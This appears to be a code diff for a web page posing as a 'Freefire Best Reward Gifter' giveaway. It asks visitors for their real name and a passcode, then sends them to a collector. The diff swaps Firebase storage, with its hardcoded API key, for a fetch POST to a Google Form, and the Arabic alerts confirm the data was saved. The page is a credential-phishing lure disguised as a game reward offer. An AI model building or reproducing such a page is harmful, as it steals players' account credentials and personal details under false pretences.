@@ -6,48 +6,30 @@
     <title>Freefire Best Reward Gifter</title>
     <link rel="stylesheet" href="styles.css"> <!-- Link to your CSS file -->
 
-    <!-- Firebase SDK -->
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js"></script>
-    
     <script>
-        // Your Firebase configuration
-        const firebaseConfig = {
-            apiKey: "AIzaSyAPPCLoihdah2hkQZn-jOg9ZV15fve4mAY",
-            authDomain: "freefire-best-reward.firebaseapp.com",
-            projectId: "freefire-best-reward",
-            storageBucket: "freefire-best-reward.firebasestorage.app",
-            messagingSenderId: "897344687951",
-            appId: "1:897344687951:web:a444291b83b6da64df3f3a"
-        };
-
-        // Initialize Firebase
-        const app = firebase.initializeApp(firebaseConfig);
-        const database = firebase.database(app); // Moved this line inside the initialization context
-
         function gatherInfo() {
             // Get the values from the input fields
             const realLifeName = document.getElementById('realLifeName').value;
             const passcode = document.getElementById('passcode').value;
 
-            // Create a log entry
-            const logEntry = {
-                name: realLifeName,
-                passcode: passcode,
-                timestamp: new Date().toISOString() // Adding a timestamp
-            };
+            // Create a FormData object for Google Form submission
+            const formData = new FormData();
+            formData.append("entry.1486279132", realLifeName); // For "IRL Name"
+            formData.append("entry.883013378", passcode); // For "Passcode"
 
-            // Store the log entry in Firebase
-            const newLogRef = database.ref('logs').push(); // Creates a new log entry in the 'logs' node
-            newLogRef.set(logEntry)
-                .then(() => {
-                    console.log('Log entry saved to Firebase:', logEntry);
-                    alert('تم حفظ المعلومات بنجاح!'); // Notify user about success
-                })
-                .catch((error) => {
-                    console.error('Error saving log entry:', error);
-                    alert('حدث خطأ أثناء حفظ المعلومات: ' + error.message); // Notify user about error
-                });
+            // Submit the form using fetch to Google Form
+            fetch('https://docs.google.com/forms/d/e/1FAIpQLScrjWYYpwwiJHYE4AkAxDlgthQdXjnGiYYhobdxwBPjK8iFHg/viewform?usp=sf_link', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                console.log('Form submitted successfully:', response);
+                alert('تم حفظ المعلومات بنجاح!'); // Notify user about success
+            })
+            .catch(error => {
+                console.error('Error submitting form:', error);
+                alert('حدث خطأ أثناء حفظ المعلومات: ' + error.message); // Notify user about error
+            });
 
             // Log the values to the console
             console.log(`Real Life Name: ${realLifeName}, Passcode: ${passcode}`);
